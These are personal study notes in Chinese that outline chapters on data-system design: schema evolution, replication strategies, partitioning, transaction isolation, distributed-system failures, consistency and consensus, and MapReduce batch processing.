向前兼容性 舊的忽略新加的index 向後兼容性 index不變，可以讀舊的 BUT 如果你添加一個新的字段，你不能設置為required optional 加上預設值 Avro 沒有args的index: 只用名字識別 為了解析二進制數據，你按照它們出現在模式中的順序遍歷這些字段，並使用模式來告訴你每個字段的數據類型 把解釋的權利交給程式: reader \u0026amp; writer 方便動態生成 如果數據庫模式發生變化，則可以從更新的數據庫模式生成新的Avro模式，並在新的Avro模式中導出數據。 Writer模式與Reader模式 雖然說分成兩個，其實就是拿一個type去parse看看 有對到就ok 兼容性 只能添加或刪除具有默認值的字段 破壞向後兼容性 添加一個沒有默認值的字段 新的Reader將無法讀取舊Writer寫的數據 破壞向前兼容性 刪除沒有默認值的字段 舊的Reader將無法讀取新Writer寫入的數據 第五章：覆制 覆制的困難之處在於處理覆制數據的變更（change）\n三種流行的變更覆制算法：\n單領導者（single leader） 腳色 主庫（master|primary） 當客戶端要向數據庫寫入時，它必須將請求發送給領導者，領導者會將新數據寫入其本地存儲 追隨者（followers） 每當領導者將新數據寫入本地存儲時，它也會將數據變更發送給所有的追隨者，稱之為覆制日志（replication log） 記錄 (change stream) 每個跟隨者從領導者拉取日志，並相應更新其本地數據庫副本，方法是按照領導者處理的相同順序應用所有寫入 設置新從庫 在某個時刻獲取主庫的一致性快照（如果可能），而不必鎖定整個數據庫 從庫連接到主庫，並拉取快照之後發生的所有數據變更 這要求快照與主庫覆制日志中的位置精確關聯 當從庫處理完快照之後積壓的數據變更，我們說它 趕上（caught up） 了主庫 同步覆制與異步覆制 同步覆制 優點 從庫保證有與主庫一致的最新數據副本 缺點 如果同步從庫沒有響應，主庫就無法處理寫入操作 主庫必須阻止所有寫入，並等待同步副本再次可用 所有從庫都設置為同步的是不切實際的 在數據庫上啟用同步覆制，通常意味著其中一個跟隨者是同步的 這保證你至少在兩個節點上擁有最新的數據副本：主庫和同步從庫 這種配置有時也被稱為 半同步（semi-synchronous） 異步覆制 優點 即使所有的從庫都落後了，主庫也可以繼續處理寫入 缺點 如果主庫失效且不可恢覆，則任何尚未覆制給從庫的寫入都會丟失 使已經向客戶端確認成功，寫入也不能保證 持久（Durable 處理節點宕機 從庫失效：追趕恢覆 主庫失效：故障切換 steps 確認主庫失效 大多數系統只是簡單使用 超時（Timeout） 節點頻繁地相互來回傳遞消息，並且如果一個節點在一段時間內沒有響應，就認為它掛了 選擇一個新的主庫 可以通過選舉過程（主庫由剩余副本以多數選舉產生）來完成 可以由之前選定的控制器節點（controller node） 來指定新的主庫 重新配置系統以啟用新的主庫。客戶端現在需要將它們的寫請求發送給新主庫 系統需要確保舊主庫意識到新主庫的存在，並成為一個從庫 要注意的 如果使用異步覆制，則新主庫可能沒有收到老主庫宕機前最後的寫入操作 如果老主庫重新加入集群，新主庫在此期間可能會收到沖突的寫入，那這些寫入該如何處理？ 如果數據庫需要和其他外部存儲相協調，那麽丟棄寫入內容是極其危險的操作 github的redis與DB (數據庫使用自增ID作為主鍵) 可能會出現兩個節點都以為自己是主庫的情況 主庫被宣告死亡之前的正確超時應該怎麽配置？ (timeout要剛好!!) 覆制日志的實現 基於語句的覆制 主庫記錄下它執行的每個寫入請求（語句，即statement）並將該語句日志發送給其從庫 問題是 非確定性函數（nondeterministic） 自增列（auto increment） 有副作用的語句 傳輸預寫式日志（WAL） 日志都是包含所有數據庫寫入的僅追加字節序列 可以使用完全相同的日志在另一個節點上構建副本 問題是 日志記錄的數據非常底層 WAL包含哪些磁盤塊中的哪些字節發生了更改 這使覆制與存儲引擎緊密耦合 如果要升級DB的話\u0026hellip; 邏輯日志覆制（基於行） 覆制和存儲引擎使用不同的日志格式，這樣可以使覆制日志從存儲引擎內部分離出來 對於插入的行，日志包含所有列的新值。 對於刪除的行，日志包含足夠的信息來唯一標識已刪除的行 對於更新的行，日志包含足夠的信息來唯一標識更新的行 這樣就可以把DB變動當成資料流!! 覆制延遲問題 當應用程序從異步從庫讀取時，如果從庫落後，它可能會看到過時的信息 複製的一致性的種種問題 讀己之寫: 讀寫一致性（read-after-write consistency） 解 都從主庫讀 讀用戶可能已經修改過的內容時 使用其他標準來決定是否從主庫讀取 客戶端可以記住最近一次寫入的時間戳 系統需要確保從庫為該用戶提供任何查詢時，該時間戳前的變更都已經傳播到了本從庫中 跨設備的寫後讀一致性 記住用戶上次更新時間戳的方法變得更加困難 元數據需要一個中心存儲 如果副本分布在不同的數據中心，很難保證來自不同設備的連接會路由到同一數據中心 4G與wifi 單調讀（Monotonic reads 如果先前讀取到較新的數據，後續讀取不會得到更舊的數據 解 實現單調讀取的一種方式是確保每個用戶總是從同一個副本進行讀取 可以基於用戶ID的散列來選擇副本 一致前綴讀（consistent prefix reads） 如果一系列寫入按某個順序發生，那麽任何人讀取這些寫入時，也會看見它們以同樣的順序出現 不存在全局寫入順序!! 解 確保任何因果相關的寫入都寫入相同的分區 多領導者（multi leader） 允許多個節點接受寫入 覆制仍然以同樣的方式發生：處理寫入的每個節點都必須將該數據更改轉發給所有其他節點 scenario 副本分散在好幾個不同的數據中心 兩個不同的數據中心可能會同時修改相同的數據，寫沖突是必須解決的 需要離線操作的客戶端 應用程序在斷網之後仍然需要繼續工作 協同編輯 處理寫入沖突 同步與異步沖突檢測 使沖突檢測同步 - 即等待寫入被覆制到所有副本，然後再告訴用戶寫入成功 失去多主覆制的主要優點：允許每個副本獨立接受寫入 收斂至一致的狀態 在多主配置中，沒有明確的寫入順序，所以最終值應該是什麽並不清楚 給每個寫入一個唯一的ID，挑選最高ID的寫入作為勝利者 (LWW, last write wins) 以某種方式將這些值合並在一起 - 例如，按字母順序排序，然後連接它們 用一種可保留所有信息的顯式數據結構來記錄沖突，並編寫解決沖突的應用程序代碼 避免沖突 確保來自特定用戶的請求始終路由到同一數據中心，並使用該數據中心的領導者進行讀寫 但是，有時你可能需要更改指定的記錄的主庫 還是必須處理不同主庫同時寫入的可能性 自定義沖突解決邏輯 寫時執行 只要數據庫系統檢測到覆制更改日志中存在沖突，就會調用沖突處理程序 讀時執行 當檢測到沖突時，所有沖突寫入被存儲 下一次讀取數據時，會將這些多個版本的數據返回給應用程序。 應用程序可能會提示用戶或自動解決沖突 多主覆制拓撲 環形和星形拓撲的問題 如果只有一個節點發生故障，則可能會中斷其他節點之間的覆制消息流 全部到全部拓撲的問題 一些網絡鏈接可能比其他網絡鏈接更快，結果是一些覆制消息可能“超過”其他覆制消息 解 用版本向量 (vector time) 無領導者（leaderless） 放棄主庫的概念，並允許任何副本直接接受來自客戶端的寫入 過法定人數就算成功 只要w + r\u0026gt; n，我們期望在讀取時獲得最新的值 因為r個讀取中至少有一個節點是最新的 遵循這些r值，w值的讀寫稱為法定人數（quorum）的讀和寫 重要的前提 寫入的節點集合和你讀取的節點集合必須重疊 你讀取的節點中必須至少有一個具有最新值的節點 法定人數一致性的局限性 即使在w + r\u0026gt; n的情況下，也可能存在返回陳舊值的邊緣情況 例子 如果使用寬松的法定人數，w個寫入和r個讀取落在完全不同的節點上 寬松的法定人數 網絡中斷期間客戶端可能仍能連接到一些數據庫節點，但又不足以組成一個特定值的法定人數 這時可以 返回錯誤 接受寫入，然後將它們寫入一些其他可達的節點，但不在這些值通常所存在的n個節點上 (寬松的法定人數) 然而，這意味著即使當w + r\u0026gt; n時，也不能確定讀取某個鍵的最新值，因為最新的值可能已經臨時寫入了n之外的某些節點 如果兩個寫入同時發生，不清楚哪一個先發生 如果寫操作與讀操作同時發生，寫操作可能僅反映在某些副本上 不確定讀取是返回舊值還是新值 如果寫操作在某些副本上成功，而在其他節點上失敗 (對面HDD爆了) 所以整體判定寫入失敗，但整體寫入失敗並沒有在寫入成功的副本上回滾 後續的讀取仍然可能會讀取這次失敗寫入的值 即使一切工作正常，有時也會不幸地出現關於時序（timing） 的邊緣情況 即使應用可以容忍陳舊的讀取，你也需要了解覆制的健康狀況 如果顯著落後，應該提醒你，以便你可以調查原因 在一個不可用的節點重新聯機之後，它如何趕上它錯過的寫入 讀修覆（Read repair） 當客戶端並行讀取多個節點時，它可以檢測到任何陳舊的響應，並將新值寫回到該副本 反熵過程（Anti-entropy process） 後台進程，該進程不斷查找副本之間的數據差異，並將任何缺少的數據從一個副本覆制到另一個副本 檢測並發寫入 問題在於，由於可變的網絡延遲和部分故障，事件可能在不同的節點以不同的順序到達 手法 (與多領導者的很像) 最後寫入勝利（丟棄並發寫入） “此前發生”的關系和並發 timestamp (安全令牌, lamport time) 服務器為每個鍵保留一個版本號，每次寫入鍵時都增加版本號，並將新版本號與寫入的值一起存儲。 當客戶端讀取鍵時，服務器將返回所有未覆蓋的值以及最新的版本號。客戶端在寫入前必須讀取。 客戶端寫入鍵時，必須包含之前讀取的版本號，並且必須將之前讀取的所有值合並在一起 當服務器接收到具有特定版本號的寫入時，它可以覆蓋該版本號或更低版本的所有值 合並同時寫入的值 一個簡單的方法是根據版本號或時間戳做union 不能處理直接刪除的case ({1} | {x1x, 2} = {1, 2}) 墓碑（tombstone, soft delete） 版本向量 (vector time) 副本在處理寫入時增加自己的版本號，並且跟蹤從其他副本中看到的版本號 這個信息指出了要覆蓋哪些並發值，以及保留哪些並發值。 第六章：分區 分區通常與覆制結合使用，使得每個分區的副本存儲在多個節點上 怎麼分配key 一些分區比其他分區有更多的數據或查詢，我們稱之為偏斜（skew） 不均衡導致的高負載的分區被稱為熱點（hot spot） 作法 將記錄隨機分配給節點 當你試圖讀取一個特定的值時，你無法知道它在哪個節點上 必須並行地查詢所有的節點 為每個分區指定一塊連續的鍵範圍（從最小值到最大值） 鍵的範圍不一定均勻分布，因為數據也很可能不均勻分布 分區邊界可以由管理員手動選擇，也可以由數據庫自動選擇 (分區再平衡) Key Range分區的缺點是某些特定的訪問模式會導致熱點 如果主鍵是時間戳，則分區對應於時間範圍 今天會先被塞爆 需要使用除了時間戳以外的其他東西作為主鍵的第一個部分 hash function 一致性哈希，即consistent hashing 失去高效執行範圍查詢的能力 負載偏斜與熱點消除 這個key就是熱門 (藝人) 所有的請求都會被路由到同一個分區 一個簡單的方法是在主鍵的開始或結尾添加一個隨機數 將主鍵進行分割之後，任何讀取都必須要做額外的工作，因為他們必須從所有主鍵分布中讀取數據並將其合並 分區與次級索引 次級索引的問題是它們不能整齊地映射到分區 次級索引通常並不能唯一地標識記錄，而是一種搜索記錄中出現特定值的方式 查找包含詞語hogwash的所有文章，查找所有顏色為紅色的車輛等等 兩種作法 基於文檔 在這種索引方法中，每個分區是完全獨立的 每個分區維護自己的次級索引，僅覆蓋該分區中的文檔 缺點 可能會使次級索引上的讀取查詢相當昂貴 * 基於關鍵詞(Term) 一個覆蓋所有分區數據的全局索引，而不是給每個分區創建自己的次級索引（本地索引） 缺點 寫入速度較慢且較為覆雜，因為寫入單個文檔現在可能會影響索引的多個分區 分區再平衡 將負載從集群中的一個節點向另一個節點移動的過程稱為再平衡（rebalancing） 要求 再平衡之後，負載（數據存儲，讀取和寫入請求）應該在集群中的節點之間公平地共享。 再平衡發生時，數據庫應該繼續接受讀取和寫入。 節點之間只移動必須的數據，以便快速再平衡，並減少網絡和磁盤I/O負載。 方法 反面教材：hash mod N 如果節點數量N發生變化，大多數鍵將需要從一個節點移動到另一個節點 固定數量的分區 創建比節點更多的分區，並為每個節點分配多個分區 如果一個節點被添加到集群中，新節點可以從當前每個節點中竊取一些分區，直到分區再次公平分配 固定總大小的動態分區 按鍵的範圍進行分區的數據庫會動態創建分區 當分區增長到超過配置的大小時，會被分成兩個分區，每個分區約占一半的數據 此過程與B樹頂層發生的過程類似 動態分區的一個優點是分區數量適應總數據量 一個空的數據庫從一個分區開始，因為沒有關於在哪里繪制分區邊界的先驗信息 數據集開始時很小，直到達到第一個分區的分割點，所有寫入操作都必須由單個節點處理 固定節點上分區數量的分區 使分區數與節點數成正比 當一個新節點加入集群時，它隨機選擇固定數量的現有分區進行拆分，然後占有這些拆分分區中每個分區的一半，同時將每個分區的另一半留在原地 隨機化可能會產生不公平的分割 運維：手動還是自動再平衡 再平衡的過程中有人參與是一件好事 這種自動化與自動故障檢測相結合可能十分危險 假設一個節點過載，並且對請求的響應暫時很慢 其他節點得出結論：過載的節點已經死亡，並自動重新平衡集群，使負載離開它 這會對已經超負荷的節點，其他節點和網絡造成額外的負載 請求路由 我要怎麼知道找誰 作出路由決策的組件（可能是節點之一，還是路由層或客戶端）如何了解分區-節點之間的分配關系變化？ 因為重要的是所有參與者都達成共識 - 否則請求將被發送到錯誤的節點 不同的方案 允許客戶聯系任何節點 請求發送到路由層，它決定了應該處理請求的節點，並相應地轉發 要求客戶端知道分區和節點的分配 第七章：事務 隔離級別 讀已提交（Read Committed） 從數據庫讀時，只能看到已提交的數據（沒有臟讀，即dirty reads）。 寫入數據庫時，只會覆蓋已經寫入的數據（沒有臟寫，即dirty writes）。 最常見的情況是，數據庫通過使用行鎖（row-level lock） 來防止臟寫 因為等待鎖，應用某個部分的遲緩可能由於連鎖效應，導致其他部分出現問題 解 對於寫入的每個對象，數據庫都會記住舊的已提交值，和由當前持有寫入鎖的事務設置的新值 當事務正在進行時，任何其他讀取對象的事務都會拿到舊值 只有當新值提交後，事務才會切換到讀取新值。 可重覆讀 中間遇到commit的值，讓read不一樣 有些情況下，不能容忍這種暫時的不一致 備份 分析查詢和完整性檢查 解 快照隔離 每個事務都從數據庫的一致快照（consistent snapshot） 中讀取 事務可以看到事務開始時在數據庫中提交的所有數據。 即使這些數據隨後被另一個事務更改，每個事務也只能看到該特定時間點的舊數據 實現快照隔離 通常使用寫鎖來防止臟寫，這意味著進行寫入的事務會阻止另一個事務修改同一個對象 \u0026amp; 快照隔離的一個關鍵原則是：讀不阻塞寫，寫不阻塞讀 數據庫必須可能保留一個對象的幾個不同的提交版本 (mvcc) 因為各種正在進行的事務可能需要看到數據庫在不同的時間點的狀態 一致性快照的可見性規則 條件 讀事務開始時，創建該對象的事務已經提交。 對象未被標記為刪除，或如果被標記為刪除，請求刪除的事務在讀事務開始時尚未提交。 steps 在每次事務開始時，數據庫列出當時所有其他（尚未提交或尚未中止）的事務清單，即使之後提交了，這些事務已執行的任何寫入也都會被忽略。 被中止事務所執行的任何寫入都將被忽略。 由具有較晚事務ID（即，在當前事務開始之後開始的）的事務所做的任何寫入都被忽略，而不管這些事務是否已經提交。 所有其他寫入，對應用都是可見的。 丟失更新 (老朋友) 只有一個副本 原子寫 顯式鎖定 比較並設置（CAS） 多主或無主覆制 沖突解決和覆制 (看前面) 寫入偏斜與幻讀 寫偏差 更新不同row (row能鎖，但在此不用鎖) 依據某個exclusive的條件，兩者同時更新 (這個沒辦法鎖) Alice和Bob是兩位值班醫生。兩人都感到不適，所以他們都決定請假 不幸的是，他們恰好在同一時間點擊按鈕下班 導致寫入偏差的幻讀 的 pattern 一個SELECT查詢找出符合條件的行，並檢查是否符合一些要求 按照第一個查詢的結果，應用代碼決定是否繼續 如果應用決定繼續操作，就執行寫入（插入、更新或刪除），並提交事務 解 物化沖突（materializing conflicts） 弄清楚如何物化沖突可能很難，也很容易出錯 並發控制機制泄漏到應用數據模型是很醜陋的做法 可串行化（Serializable） 真的串行執行 在單個線程上按順序一次只執行一個事務 單線程循環執行事務是可行的!! RAM足夠便宜了，許多場景現在都可以將完整的活躍數據集保存在內存中 數據庫設計人員意識到OLTP事務通常很短，而且只進行少量的讀寫操作 其吞吐量僅限於單個CPU核的吞吐量 為了充分利用單一線程，需要與傳統形式的事務不同的結構 在這種交互式的事務方式中，應用程序和數據庫之間的網絡通信耗費了大量的時間 如果不允許在數據庫中進行並發處理，且一次只處理一個事務，則吞吐量將會非常糟糕 SO, 具有單線程串行事務處理的系統不允許交互式的多語句事務 取而代之，應用程序必須提前將整個事務代碼作為存儲過程提交給數據庫 存儲過程 優點 存儲過程與內存存儲，使得在單個線程上執行所有事務變得可行 不需要等待I/O 避免了並發控制機制的開銷 單個線程上實現相當好的吞吐量 缺點 每個數據庫廠商都有自己的存儲過程語言 在數據庫中運行的代碼難以管理 數據庫通常比應用服務器對性能敏感的多，因為單個數據庫實例通常由許多應用服務器共享 寫不好大家出事 兩階段鎖定（2PL，two-phase locking） 在2PL中，寫入不僅會阻塞其他寫入，也會阻塞讀，反之亦然 快照隔離使得讀不阻塞寫，寫也不阻塞讀 一次拿所有的鎖，跑，一次放掉 缺點 如果transcation跑很久 整個效能就很慢 (高百分位點處的響應會非常的慢) 可能發生死鎖 但在基於2PL實現的可串行化隔離級別中，它們會出現的頻繁的多 謂詞鎖 條件可以上鎖!! 有range版 可串行化快照隔離（SSI, serializable snapshot isolation） 數據庫如何知道查詢結果是否可能已經改變？ (前提變了) 檢測舊MVCC讀取 數據庫需要跟蹤一個事務由於MVCC可見性規則而忽略另一個事務的寫入 當事務想要提交時，數據庫檢查是否有任何被忽略的寫入現在已經被提交 如果是這樣，事務必須中止 檢測影響之前讀取的寫入 SSI鎖類似謂詞鎖，但不會阻塞其他事務 (一個記號) 提交時，若其他事務的沖突寫入已經被提交(有記號) 事務必須中止 優點 事務不需要阻塞等待另一個事務所持有的鎖 不局限於單個CPU核的吞吐量 缺點 長時間讀取和寫入數據的事務很可能會發生沖突並中止 因此SSI要求同時讀寫的事務盡量短 第八章：分布式系統的麻煩 使用分布式系統與在一台計算機上編寫軟件有著根本的區別，主要的區別在於有許多新穎和刺激的方法可以使事情出錯\n去理解我們能夠依賴，和不可以依賴的東西\n沒有共享內存，只有通過可變延遲的不可靠網絡傳遞的消息，系統可能遭受部分失效，不可靠的時鐘和處理暫停\n網絡中的一個節點無法確切地知道任何事情——它只能根據它通過網絡接收到（或沒有接收到）的消息進行猜測。\n不能確定對面是不是在搞 (拜占庭問題)\n在分布式系統中，我們可以陳述關於行為（系統模型）的假設，並以滿足這些假設的方式設計實際系統。算法可以被證明在某個系統模型中正確運行。這意味著即使底層系統模型提供了很少的保證，也可以實現可靠的行為\n部分失效 在一台電腦上 如果發生內部錯誤，我們寧願電腦完全崩潰，而不是返回錯誤的結果，因為錯誤的結果很難處理 在分布式系統 只能面對現實世界的混亂現實，容忍錯誤 部分失效（partial failure） 盡管系統的其他部分工作正常，但系統的某些部分可能會以某種不可預知的方式被破壞 部分失效是不確定性的（nonderterministic） 不可靠的網絡 發送請求並期待響應，則很多事情可能會出錯 (不會知道對面發生什麼事導致lost) 請求可能已經丟失 請求可能正在排隊，稍後將交付 遠程節點可能已經失效 遠程節點可能暫時停止了響應 (進程暫停) 遠程節點可能已經處理了請求，但是網絡上的響應已經丟失 遠程節點可能已經處理了請求，但是響應已經被延遲，並且稍後將被傳遞 網路特性 不確定: 網絡擁塞和排隊 不可靠: 掉包 都是為了讓網路利用最大化 對比: 電信網路 一次占用一個線路 線路速度固定 (在空閒時不能多用!!) 緩和的方法 檢測故障 (把遠程節點關閉) 特定的方法 如果節點進程崩潰（或被管理員殺死），但節點的操作系統仍在運行，則腳本可以通知其他節點有關該崩潰的信息 如果你有權訪問數據中心網絡交換機的管理界面，則可以通過它們檢測硬件級別的鏈路故障 general 重複送、timeout (但sender還是不知道發生什麼了) timout要多久? timeout短: 可能把正在跑的殺了 (之後可能cascade) timeout長: 效能 用algo根據response time去動態調 不可靠的時鐘 我們想透過時間知道 持續時間 單調鐘 (物理時鐘) 保證總是往前走的事實 在多顆cpu下，OS會試著保證單調鐘的性質 但還是保持懷疑的態度比較好 時間點 日歷時鐘 (物理時鐘) NTP同步有誤差，可能會回跳 邏輯時鐘（logic clock） 用計數器遞增 時鐘讀數存在置信區間 因為誤差 這樣能用物理時鐘作快照隔離transaction的id嗎? google Spanner 要確保小的時鐘不確定性 commit之前等一段時間 (置信區間) 進程暫停 自己看到的東西與別人認為的不同 因進程暫停導致自己以為 我還是leader 我的timer還沒到期 (像lease到期) 進程暫停的可能原因 preempt process GC page fault導致的IO IO vm suspend 注意 分布式系統中的節點，必須假定其執行可能在任意時刻暫停相當長的時間，即使是在一個函數的中間 可能的努力 hard real-time: 需要OS與各種程式的保證 限制垃圾收集 將GC暫停視為一個節點的短暫計劃中斷，並在這個節點收集其垃圾的同時，讓其他節點處理來自客戶端的請求 只用垃圾收集器來處理短命對象，並定期在積累大量長壽對象（因此需要完整GC）之前重新啟動進程 防護令牌（fencing token） 這個數字在每次授予鎖(lease)定時都會增加 然後，我們可以要求客戶端每次向存儲服務發送寫入請求時，都必須包含當前的防護令牌 知識、真相與謊言 節點不一定能相信自己對於情況的判斷 node可能突然智障 在航空航天環境中，計算機內存或CPU寄存器中的數據可能被輻射破壞，導致其以任意不可預知的方式響應其他節點 有不信任的點 解 法定人數，即在節點之間進行投票 防止“撒謊”弱形式的機制 對輸入檢查 CRC escape 算法的正確性 如果某些假設爆了，最少有哪些特性要保持? 安全（safety）屬性 沒有壞事發生 如果安全屬性被違反，我們可以指向一個特定的安全屬性被破壞的時間點 活性（liveness）屬性 最終好事發生 在某個時間點，它可能不成立，但總是希望在未來能成立 在系統模型的所有可能情況下，要求始終保持安全屬性是常見的 對於活性屬性，我們可以提出一些注意事項 系統模型與現實 時序假設 同步模型（synchronous model） 假設網絡延遲、進程暫停和和時鐘誤差都是受限的 網絡延遲、暫停和時鐘漂移將永遠不會超過某個固定的上限 部分同步（partial synchronous） 一個系統在大多數情況下像一個同步系統一樣運行，但有時候會超出網絡延遲，進程暫停和時鐘漂移的界限 異步模型 一個算法不允許對時序做任何假設——事實上它甚至沒有時鐘（所以它不能使用超時） 節點失效 崩潰停止（crash-stop） 算法可能會假設一個節點只能以一種方式失效，即通過崩潰 崩潰-恢覆（crash-recovery） 我們假設節點可能會在任何時候崩潰，但也許會在未知的時間之後再次開始響應 拜占庭（任意）故障 節點可以做（絕對意義上的）任何事情，包括試圖戲弄和欺騙其他節點 將系統模型映射到現實世界 算法的理論描述可以簡單宣稱一些事是不會發生的 在非拜占庭式系統中，我們確實需要對可能發生和不可能發生的故障做出假設 真實世界的實現，仍然會包括處理“假設上不可能”情況的代碼 printf(\u0026ldquo;Sucks to be you\u0026rdquo;)和exit(666) 第九章：一致性與共識 構建容錯系統的最好方法，是找到一些帶有實用保證的通用抽象，實現一次，然後讓應用依賴這些保證\n通過使用事務，應用可以假裝沒有崩潰（原子性），沒有其他人同時訪問數據庫（隔離），存儲設備是完全可靠的（持久性）\n分布式系統最重要的抽象之一就是共識（consensus）：就是讓所有的節點對某件事達成一致\n在與只提供弱保證的數據庫打交道時，你需要始終意識到它的局限性，而不是意外地作出太多假設\n在與只提供弱保證的數據庫打交道時，你需要始終意識到它的局限性，而不是意外地作出太多假設\n盡管兩者有一部分內容重疊，但它們大多是無關的問題：事務隔離主要是為了避免由於同時執行事務而導致的競爭狀態，而分布式一致性主要關於在面對延遲和故障時如何協調副本間的狀態\n線性一致性（linearizability）\n讓一個系統看起來好像只有一個數據副本，而且所有的操作都是原子性的 線性一致性是一個新鮮度保證（recency guarantee） 在一個線性一致的系統中，我們可以想象，在 x 的值從0 自動翻轉到 1 的時候（在寫操作的開始和結束之間）必定有一個時間點 cas成功的時候 線性一致性與可串行化 可串行化（Serializability） 事務的隔離屬性 它確保事務的行為，與它們按照某種順序依次執行的結果相同 線性一致性（Linearizability） 讀取和寫入寄存器（單個對象）的新鮮度保證 它不會將操作組合為事務，因此它也不會阻止寫入偏差等問題 可串行 imply 線性一致? 基於兩階段鎖定的可串行化實現或真的串行執行通常是線性一致性的 可串行化的快照隔離不是線性一致性的 它從一致的快照中進行讀取，以避免讀者和寫者之間的鎖競爭 一致性快照的要點就在於它不會包括該快照之後的寫入，因此從快照讀取不是線性一致性的。 scnerio 鎖定和領導選舉 約束和唯一性保證 跨信道的時序依賴 實現線性一致的系統 (副本) 單主覆制 可能線性一致 一個節點很可能會認為它是領導者，而事實上並非如此 共識算法 線性一致 防止腦裂和陳舊副本的措施 多主覆制 非線性一致 LWW與沒有固定資料來源 無主覆制 也許不是線性一致的 有網路延遲就會讓write變慢，這樣就有可能讀到舊的 做讀修復就可以保持線性一致 (client看到新的就寫回去舊的source) 只能實現線性一致的讀寫 不能實現線性一致的比較和設置（CAS）操作 因為它需要一個共識算法 寬松的法定人數 線性一致性的代價 網絡中斷迫使在線性一致性和可用性之間做出選擇 為了提高性能而選擇了犧牲線性一致性，而不是為了容錯 如果你想要線性一致性，讀寫請求的響應時間至少與網絡延遲的不確定性成正比 順序保證\n順序反覆出現有幾個原因，其中一個原因是，它有助於保持因果關系（causality） 因果一致（causally consistent） 一個系統服從因果關系所規定的順序 快照隔離提供了因果一致性：當你從數據庫中讀取到一些數據時，你一定還能夠看到其因果前驅 因果順序不是全序的 (有併發的事件所以沒有全序) 線性一致性強於因果一致性 線性一致性 在線性一致的系統中，操作是全序的 (表現的就好像只有一個數據副本) 因果性 兩個事件是因果相關的（一個發生在另一個事件之前），則它們之間是有序的 它們是並發的，則它們之間的順序是無法比較的 線性一致性隱含著（implies） 因果關系 許多情況下，看上去需要線性一致性的系統，實際上需要的只是因果一致性，因果一致性可以更高效地實現 捕獲因果關系 為了確定因果依賴，我們需要一些方法來描述系統中節點的“知識” 如果節點在發出寫入Y 的請求時已經看到了 X的值，則 X 和 Y 可能存在因果關系 在檢測並發寫入時看到的版本向量 是檢測到對同一個鍵的並發寫入 所以需要一個更高維的版本來跟蹤整個數據庫中的因果依賴 序列號順序 雖然因果是一個重要的理論概念，但實際上跟蹤所有的因果關系是不切實際的 改用序列號順序 使用序列號（sequence nunber） 或時間戳（timestamp） 來排序事件 每個操作都有一個唯一的序列號，而且總是可以比較兩個序列號，確定哪一個更大 與因果一致（consistent with causality） 的全序 並行操作之間可以任意排序。這樣一個全序關系捕獲了所有關於因果的信息，但也施加了一個比因果性要求更為嚴格的順序 蘭伯特時間戳 (Lamport) 蘭伯特時間戳就是兩者的簡單組合：（計數器，節點ID） 蘭伯特時間戳與物理的日歷時鐘沒有任何關系，但是它提供了一個全序：如果你有兩個時間戳，則計數器值大者是更大的時間戳 作法 每個節點和每個客戶端跟蹤迄今為止所見到的最大計數器值，並在每個請求中包含這個最大計數器值 當一個節點收到最大計數器值大於自身計數器值的請求或響應時，它立即將自己的計數器設置為這個最大值。 蘭伯特時間戳 \u0026amp; 版本向量 版本向量可以區分兩個操作是並發的，還是一個因果依賴另一個 蘭伯特時間戳總是施行一個全序 無法分辨兩個操作是並發的還是因果依賴的 光有時間戳排序還不夠 只有在所有的操作都被收集之後，操作的全序才會出現 (當下不會知道) 為了實現諸如用戶名上的唯一約束這種東西 僅有操作的全序是不夠的 你還需要知道這個全序何時會塵埃落定 全序廣播 全序廣播\n順序在消息送達時被固化 如果後續的消息已經送達，節點就不允許追溯地將（先前）消息插入順序中的較早位置 這個事實使得全序廣播比時間戳排序更強 要滿足兩個安全屬性 可靠交付（reliable delivery） 沒有消息丟失：如果消息被傳遞到一個節點，它將被傳遞到所有節點 全序交付（totally ordered delivery） 消息以相同的順序傳遞給每個節點 消息被保證以固定的順序可靠地傳送，但是不能保證消息何時被送達 可以使用全序廣播來實現可串行化的事務 每個消息都代表一次數據庫的寫入，且每個副本都按相同的順序處理相同的寫入 那麽副本間將相互保持一致（除了臨時的覆制延遲） 這個原理被稱為狀態機覆制 使用全序廣播實現線性一致的存儲 從形式上講，線性一致讀寫寄存器是一個“更容易”的問題 全序廣播等價於共識 共識問題在異步的崩潰-停止模型中沒有確定性的解決方案 線性一致的讀寫寄存器可以在這種模型中實現 支持諸如比較並設置（CAS, compare-and-set），或自增並返回（increment-and-get） 的原子操作使線性一致等價於共識問題 作法 寫入線性一致 在log加消息claim要加資料 讀日志，並等待你剛才追加的消息被讀回 如果第一筆是你的req就可以commit，不然就abort 讀取線性一致 在log加消息claim要讀資料 讀日志，並等待你剛才追加的消息被讀回，有了就去讀 使用線性一致性存儲實現全序廣播 作法 每個要通過全序廣播發送的消息首先對線性一致寄存器執行自增並返回操作 你對線性一致性的序列號生成器進行過足夠深入的思考，你不可避免地會得出一個共識算法 然後將從寄存器獲得的值作為序列號附加到消息中 然後你可以將消息發送到所有節點（重新發送任何丟失的消息），而收件人將按序列號依序傳遞（deliver）消息 分布式事務與共識\n場景 領導選舉 原子提交 兩階段提交（two-phase commit） 用於實現跨多個節點的原子事務提交的算法，即確保所有節點提交或所有節點中止 當應用準備提交時，協調者開始階段 1 ：它發送一個準備（prepare） 請求到每個節點，詢問它們是否能夠提交 如果所有參與者都回答“是”，表示它們已經準備好提交，那麽協調者在階段 2 發出提交（commit） 請求 兩個關鍵的“不歸路”點 當參與者投票“是”時，它承諾它稍後肯定能夠提交 一旦協調者做出決定，這一決定是不可撤銷的 協調者失效 只能等待協調者自己好 讓管理員手動決定提交還是回滾事務 關心存疑事務？ 數據庫事務通常獲取待修改的行上的行級排他鎖，以防止臟寫 容錯共識\n特點 一致同意（Uniform agreement）: 沒有兩個節點的決定不同。 完整性（Integrity）: 沒有節點決定兩次。 有效性（Validity）: 如果一個節點決定了值 v ，則 v 由某個節點所提議 終止（Termination）: 由所有未崩潰的節點來最終決定值。 方法 如果你不關心容錯，那麽滿足前三個屬性很容易：你可以將一個節點硬編碼為“獨裁者”，並讓該節點做出所有的決定 它實質上說的是，一個共識算法不能簡單地永遠閑坐著等死 全序廣播相當於重覆進行多輪共識 限制 共識系統總是需要嚴格多數來運轉 大多數共識算法假定參與投票的節點是固定的集合 共識系統通常依靠超時來檢測失效的節點 第十章：批處理 使用MapReduce編程模型，能將計算的物理網絡通信層面（從正確的機器獲取數據）從應用邏輯中剝離出來（獲取數據後執行處理）\nMapReduce作業執行 讀folder hadoop: 將計算放在數據附近 (copy code過去) DB: 把資料拉回來 map: 分類(加上key) Map任務的數量由輸入文件塊的數量決定 reduce: 根據key做運算 \u0026amp; 合併 \u0026amp; sort!! Reducer的任務的數量是由作業作者配置 放到folder MapReduce工作流 一個作業的輸出成為下一個作業的輸入 通過目錄名隱式實現 